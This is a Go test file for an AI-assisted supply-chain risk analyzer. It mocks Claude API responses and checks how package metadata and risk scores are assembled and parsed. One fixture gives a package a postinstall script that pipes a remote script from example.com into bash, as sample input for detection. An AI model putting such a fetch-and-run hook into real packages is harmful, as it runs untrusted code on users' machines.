package ai

import (
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/metalstormbass/snyft/pkg/models"
)

// Test: NewCheckAnalyzer creates a properly initialized analyzer
// Justification: Constructor must correctly wire the client dependency
// Source: Go constructor initialization patterns
// Methodology: Create analyzer with a client, verify it's non-nil
// Result: Analyzer should be created with the provided client
func TestNewCheckAnalyzer(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)
	if analyzer == nil {
		t.Fatal("expected non-nil analyzer")
	}
	if analyzer.client != client {
		t.Error("expected analyzer to reference the provided client")
	}
}

// Test: AnalyzeDeep gracefully handles nil SupplyChainScore
// Justification: AnalyzeDeep must not panic when SupplyChainScore is nil,
//
//	as some packages may lack scoring data
//
// Source: Defensive programming for optional data
// Methodology: Pass result with nil SupplyChainScore, verify returns nil
// Result: Should return nil without error or panic
func TestAnalyzeDeep_NilSupplyChainScore(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		RiskLevel:        "MEDIUM",
		SupplyChainScore: nil, // No supply chain score
	}

	deep := analyzer.AnalyzeDeep(context.Background(), "test-pkg", models.EcosystemNPM, result)
	if deep != nil {
		t.Error("expected nil result when SupplyChainScore is nil")
	}
}

// Test: AnalyzeDeep returns valid DeepAnalysisResult on API success
// Justification: The consolidated deep analysis call must parse and return
//
//	cross-cutting findings with compound risks and behavioral anomalies
//
// Source: Per-package holistic AI analysis design (check_analyzer.go AnalyzeDeep)
// Methodology: Mock the API to return valid JSON; verify DeepAnalysisResult is populated
// Result: DeepAnalysisResult should have risk assessment, compound risks, and confidence
func TestAnalyzeDeep_Success(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		deepJSON := `{"risk_assessment":"This package has elevated compromise risk due to compound signals.","compound_risks":[{"pattern":"single maintainer + dormancy","risk_level":"HIGH","contributing":["1 maintainer","no commits in 6 months"],"explanation":"Classic account takeover setup"}],"behavior_findings":["Maintainer email uses free provider"],"missed_by_rules":["Download count suggests high-value target"],"confidence":0.85}`
		fmt.Fprintf(w, `{
			"id": "msg_test",
			"type": "message",
			"role": "assistant",
			"model": "claude-sonnet-4-5-20250929",
			"content": [{"type": "text", "text": %q}],
			"stop_reason": "end_turn",
			"usage": {"input_tokens": 500, "output_tokens": 200}
		}`, deepJSON)
	}))
	defer server.Close()

	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	cfg.BaseURL = server.URL
	cfg.EnableCache = false
	cfg.EnableRateLimit = false
	cfg.EnableCircuitBreaker = false

	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("failed to create client: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		RiskLevel: "MEDIUM",
		RiskScore: 50,
		Metadata: models.PackageMetadata{
			Maintainers:   []string{"alice"},
			RepoStars:     500,
			DownloadCount: 10000,
			HasCI:         true,
		},
		SourceCodeAvailable: true,
		SupplyChainScore: &models.SupplyChainScore{
			TotalScore: 8,
			RiskLevel:  "MEDIUM",
			CategoryScores: models.CategoryScores{
				PublisherControl: models.CategoryScore{RiskPoints: 1, Description: "Single maintainer", Verified: true},
				OwnershipChanges: models.CategoryScore{RiskPoints: 0, Description: "No changes", Verified: true},
				ReleaseAnomalies: models.CategoryScore{RiskPoints: 1, Description: "Dormant period", Verified: true},
				InstallExecution: models.CategoryScore{RiskPoints: 0, Description: "No scripts", Verified: true},
				DependencySprawl: models.CategoryScore{RiskPoints: 1, Description: "Moderate deps", Verified: true},
				Provenance:       models.CategoryScore{RiskPoints: 2, Description: "No attestation", Verified: true},
				Health:           models.CategoryScore{RiskPoints: 1, Description: "Low bus factor", Verified: true},
				Governance:       models.CategoryScore{RiskPoints: 1, Description: "No security policy", Verified: true},
				ReleaseSecurity:  models.CategoryScore{RiskPoints: 1, Description: "No signed tags", Verified: true},
				PackageMaturity:  models.CategoryScore{RiskPoints: 0, Description: "Mature package", Verified: true},
			},
		},
	}

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	deep := analyzer.AnalyzeDeep(ctx, "test-package", models.EcosystemNPM, result)

	if deep == nil {
		t.Fatal("expected non-nil DeepAnalysisResult")
	}
	if deep.RiskAssessment == "" {
		t.Error("expected non-empty RiskAssessment")
	}
	if len(deep.CompoundRisks) == 0 {
		t.Error("expected at least one compound risk")
	}
	if deep.CompoundRisks[0].Pattern == "" {
		t.Error("expected non-empty compound risk pattern")
	}
	if deep.CompoundRisks[0].RiskLevel == "" {
		t.Error("expected non-empty compound risk level")
	}
	if len(deep.CompoundRisks[0].Contributing) == 0 {
		t.Error("expected contributing signals in compound risk")
	}
	if len(deep.BehaviorFindings) == 0 {
		t.Error("expected at least one behavior finding")
	}
	if len(deep.MissedByRules) == 0 {
		t.Error("expected at least one missed-by-rules insight")
	}
	if deep.Confidence <= 0 {
		t.Error("expected positive confidence")
	}
}

// Test: AnalyzeDeep gracefully handles API errors
// Justification: AI analysis failures must never block or fail the main scan
// Source: Graceful degradation pattern for AI-augmented analysis
// Methodology: Mock API that always returns 400 errors; verify returns nil
// Result: Should return nil when API fails
func TestAnalyzeDeep_APIErrors(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusBadRequest)
		fmt.Fprint(w, `{"type":"error","error":{"type":"invalid_request_error","message":"test"}}`)
	}))
	defer server.Close()

	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	cfg.BaseURL = server.URL
	cfg.EnableCache = false
	cfg.EnableRateLimit = false
	cfg.EnableCircuitBreaker = false
	cfg.EnableRetry = false

	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("failed to create client: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		RiskLevel: "MEDIUM",
		Metadata:  models.PackageMetadata{Maintainers: []string{"alice"}},
		SupplyChainScore: &models.SupplyChainScore{
			TotalScore:     5,
			CategoryScores: models.CategoryScores{},
		},
	}

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	deep := analyzer.AnalyzeDeep(ctx, "fail-pkg", models.EcosystemNPM, result)
	if deep != nil {
		t.Error("expected nil result on API error")
	}
}

// Test: AnalyzeDeep parses markdown-wrapped JSON responses
// Justification: Claude may return JSON wrapped in markdown code blocks;
//
//	both formats must be handled correctly
//
// Source: Anthropic API response format documentation
// Methodology: Test with ```json-wrapped JSON response
// Result: Should parse into correct DeepAnalysisResult
func TestAnalyzeDeep_MarkdownWrappedJSON(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		wrappedJSON := "```json\n{\"risk_assessment\":\"Low risk.\",\"compound_risks\":[],\"behavior_findings\":[],\"missed_by_rules\":[],\"confidence\":0.7}\n```"
		fmt.Fprintf(w, `{
			"id": "msg_test",
			"type": "message",
			"role": "assistant",
			"model": "claude-sonnet-4-5-20250929",
			"content": [{"type": "text", "text": %q}],
			"stop_reason": "end_turn",
			"usage": {"input_tokens": 500, "output_tokens": 100}
		}`, wrappedJSON)
	}))
	defer server.Close()

	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	cfg.BaseURL = server.URL
	cfg.EnableCache = false
	cfg.EnableRateLimit = false
	cfg.EnableCircuitBreaker = false
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("failed to create client: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		RiskLevel:        "LOW",
		SupplyChainScore: &models.SupplyChainScore{TotalScore: 2, RiskLevel: "LOW", CategoryScores: models.CategoryScores{}},
	}

	deep := analyzer.AnalyzeDeep(context.Background(), "safe-pkg", models.EcosystemNPM, result)
	if deep == nil {
		t.Fatal("expected non-nil result for markdown-wrapped JSON")
	}
	if deep.RiskAssessment != "Low risk." {
		t.Errorf("expected 'Low risk.' assessment, got %q", deep.RiskAssessment)
	}
}

// Test: AnalyzeDeep returns nil for invalid JSON response
// Justification: Non-JSON responses from Claude must be handled gracefully
// Source: Defensive programming for AI outputs
// Methodology: Mock API returns plain text that is not valid JSON
// Result: Should return nil (graceful degradation)
func TestAnalyzeDeep_InvalidJSON(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{
			"id": "msg_test",
			"type": "message",
			"role": "assistant",
			"model": "claude-sonnet-4-5-20250929",
			"content": [{"type": "text", "text": "This is not valid JSON at all"}],
			"stop_reason": "end_turn",
			"usage": {"input_tokens": 50, "output_tokens": 20}
		}`)
	}))
	defer server.Close()

	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	cfg.BaseURL = server.URL
	cfg.EnableCache = false
	cfg.EnableRateLimit = false
	cfg.EnableCircuitBreaker = false
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("failed to create client: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		RiskLevel:        "MEDIUM",
		SupplyChainScore: &models.SupplyChainScore{TotalScore: 5, CategoryScores: models.CategoryScores{}},
	}

	deep := analyzer.AnalyzeDeep(context.Background(), "test-pkg", models.EcosystemNPM, result)
	if deep != nil {
		t.Error("expected nil result for invalid JSON response")
	}
}

// ============================================================================
// FULL CONTEXT BUILDER TESTS
// ============================================================================

// Test: buildFullContext includes all categories and metadata
// Justification: The consolidated context must include ALL data so the AI can
//
//	perform holistic cross-cutting analysis
//
// Source: Deep analysis design requiring complete package view
// Methodology: Build context with rich metadata, verify key sections present
// Result: Context should include all 10 category scores, risk factors, metadata
func TestBuildFullContext(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		RiskLevel: "MEDIUM",
		RiskScore: 50,
		RiskFactors: []string{
			"No verifiable source code",
			"Single maintainer",
		},
		SourceCodeAvailable: true,
		SourceVerification: &models.SourceVerification{
			HasMatchingGitTag: true,
			HasSourcePackage:  true,
		},
		Findings: []models.Finding{
			{Severity: "HIGH", Category: "Publisher Control", Description: "Single maintainer detected", Evidence: "npm registry data"},
			{Severity: "MEDIUM", Category: "Health", Description: "Low bus factor"},
		},
		Metadata: models.PackageMetadata{
			Maintainers:         []string{"alice", "bob"},
			DownloadCount:       1000000,
			RepoStars:           500,
			RepoForks:           50,
			RepoOpenIssues:      10,
			RepoOwner:           "test-org",
			PublishedAt:         time.Date(2020, 1, 1, 0, 0, 0, 0, time.UTC),
			RepoCreatedAt:       time.Date(2019, 6, 1, 0, 0, 0, 0, time.UTC),
			RepoLastCommit:      time.Date(2025, 12, 1, 0, 0, 0, 0, time.UTC),
			LatestVersion:       "3.2.1",
			BusFactor:           2,
			TopContributorPct:   60.0,
			CodeReviewRate:      80.0,
			HasBranchProtection: true,
			RequiredReviewers:   1,
			HasCI:               true,
			CISystems:           []string{"GitHub Actions"},
			HasSelfHosted:       false,
			HasReleaseProcess:   true,
			SignedReleases:      false,
			HasSLSAAttestation:  false,
			HasSigstoreSignature: false,
			HasNPMProvenance:    true,
			HasInstallScripts:   false,
			RepoArchived:        false,
			OSSFScore:           7.5,
			License:             "MIT",
		},
		SupplyChainScore: &models.SupplyChainScore{
			TotalScore: 8,
			RiskLevel:  "MEDIUM",
			CategoryScores: models.CategoryScores{
				PublisherControl: models.CategoryScore{RiskPoints: 1, Description: "Two maintainers", Evidence: "npm registry"},
				OwnershipChanges: models.CategoryScore{RiskPoints: 0, Description: "No changes"},
				ReleaseAnomalies: models.CategoryScore{RiskPoints: 1, Description: "Minor anomalies"},
				InstallExecution: models.CategoryScore{RiskPoints: 0, Description: "No scripts"},
				DependencySprawl: models.CategoryScore{RiskPoints: 1, Description: "Moderate deps"},
				Provenance:       models.CategoryScore{RiskPoints: 2, Description: "No attestation"},
				Health:           models.CategoryScore{RiskPoints: 1, Description: "Low bus factor"},
				Governance:       models.CategoryScore{RiskPoints: 1, Description: "No security policy"},
				ReleaseSecurity:  models.CategoryScore{RiskPoints: 1, Description: "No signed tags"},
				PackageMaturity:  models.CategoryScore{RiskPoints: 0, Description: "Mature package"},
			},
		},
	}

	ctx := analyzer.buildFullContext("express", models.EcosystemNPM, result)

	expectedContent := []string{
		// Package identity
		"express", "npm",
		// All 10 categories
		"Publisher Control", "Ownership Changes", "Release Anomalies",
		"Install Execution", "Dependency Sprawl", "Provenance",
		"Health", "Governance", "Release Security", "Package Maturity",
		// Score summary
		"Total: 8/20", "MEDIUM",
		// Risk factors
		"No verifiable source code",
		"Single maintainer",
		// High-severity findings
		"Single maintainer detected",
		// Metadata
		"Maintainer count: 2",
		"Downloads: 1000000",
		"Stars: 500",
		"Bus factor: 2",
		"Code review rate: 80%",
		"Branch protection: true",
		"Has CI: true",
		"GitHub Actions",
		"npm provenance: true",
		"Source code available: true",
		"OSSF Scorecard: 7.5/10",
	}
	for _, expected := range expectedContent {
		if !strings.Contains(ctx, expected) {
			t.Errorf("full context missing: %q", expected)
		}
	}
}

// Test: buildFullContext handles minimal/empty metadata without panic
// Justification: Context builder must be robust to missing data - many packages
//
//	have incomplete metadata due to API failures or private repos
//
// Source: Graceful degradation for incomplete data
// Methodology: Build context with empty metadata
// Result: Context should be non-empty and contain at least package name
func TestBuildFullContext_MinimalData(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{},
		SupplyChainScore: &models.SupplyChainScore{
			TotalScore:     0,
			RiskLevel:      "LOW",
			CategoryScores: models.CategoryScores{},
		},
	}

	ctx := analyzer.buildFullContext("minimal-pkg", models.EcosystemNPM, result)
	if ctx == "" {
		t.Error("produced empty context")
	}
	if !strings.Contains(ctx, "minimal-pkg") {
		t.Error("context missing package name")
	}
}

// Test: buildFullContext includes install script contents for semantic analysis
// Justification: Install scripts are the primary vector for supply chain attacks;
//
//	the AI needs the actual script content for behavioral analysis
//
// Source: Ohm et al. (2020) - install-time execution as primary attack vector
// Methodology: Build context with install scripts
// Result: Context should include script type and content
func TestBuildFullContext_IncludesInstallScripts(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		Metadata: models.PackageMetadata{
			HasInstallScripts: true,
			InstallScripts: map[string]string{
				"postinstall": "curl -sL https://example.com/setup.sh | bash",
			},
		},
		SupplyChainScore: &models.SupplyChainScore{
			TotalScore:     5,
			RiskLevel:      "MEDIUM",
			CategoryScores: models.CategoryScores{},
		},
	}

	ctx := analyzer.buildFullContext("risky-pkg", models.EcosystemNPM, result)

	if !strings.Contains(ctx, "Has install scripts: true") {
		t.Error("context missing install scripts indicator")
	}
	if !strings.Contains(ctx, "postinstall") {
		t.Error("context missing script type")
	}
	if !strings.Contains(ctx, "curl -sL") {
		t.Error("context missing script content")
	}
}

// Test: AnalyzeAllCategories is a no-op (backward compatibility)
// Justification: AnalyzeAllCategories is kept for backward compatibility but
//
//	should not modify the result; deep analysis is called separately
//
// Source: API migration pattern
// Methodology: Call AnalyzeAllCategories, verify result is unchanged
// Result: No AIInsight fields should be populated
func TestAnalyzeAllCategories_IsNoOp(t *testing.T) {
	cfg := DefaultConfig()
	cfg.APIKey = "test-key"
	client, err := NewClient(cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer func() { _ = client.Close() }()

	analyzer := NewCheckAnalyzer(client)

	result := &models.AnalysisResult{
		RiskLevel: "MEDIUM",
		SupplyChainScore: &models.SupplyChainScore{
			TotalScore:     5,
			CategoryScores: models.CategoryScores{},
		},
	}

	analyzer.AnalyzeAllCategories(context.Background(), "test-pkg", models.EcosystemNPM, result)

	// Should be unchanged
	cs := result.SupplyChainScore.CategoryScores
	if cs.PublisherControl.AIInsight != nil {
		t.Error("expected nil AIInsight after no-op AnalyzeAllCategories")
	}
}
